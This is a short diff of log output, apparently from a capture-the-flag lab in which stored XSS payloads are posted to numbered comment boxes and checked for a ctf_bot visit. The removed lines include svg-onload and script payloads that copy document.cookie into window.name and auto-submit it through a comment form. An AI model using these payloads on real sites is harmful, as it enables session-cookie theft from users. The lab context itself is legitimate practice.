@@ -1,10 +1,8 @@
-box 261 payload(60): <svg/onload=f=document.all.body;f.value='X';f.form.submit()>
-   chant: "A wild cheer erupts: <svg/onload=f=document.all.body;f.value='X';f.form.submit()>!"
-box 262 payload(37): <script>name=document.cookie</script>
-   chant: 'A wild cheer erupts: <script>name=document.cookie</script>!'
-box 263 payload(61): <svg/onload=f=document.all.body;f.value=name;f.form.submit()>
-   chant: 'A wild cheer erupts: <svg/onload=f=document.all.body;f.value=name;f.form.submit()!'
-S comments:  <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> 
-A name now: 
-B comments:  <li class="muted">No comments yet.</li> 
-B cookie: 
+my boxes: 263 [1, 2, 3, 4, 5] ... [259, 260, 261, 262, 263]
+others: []
+box 261 comments:  <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> <li><strong>@trainer01</strong> X</li> <li><stro
+   has ctf_bot: False
+box 262 comments:  <li class="muted">No comments yet.</li> 
+   has ctf_bot: False
+box 263 comments:  <li class="muted">No comments yet.</li> 
+   has ctf_bot: False
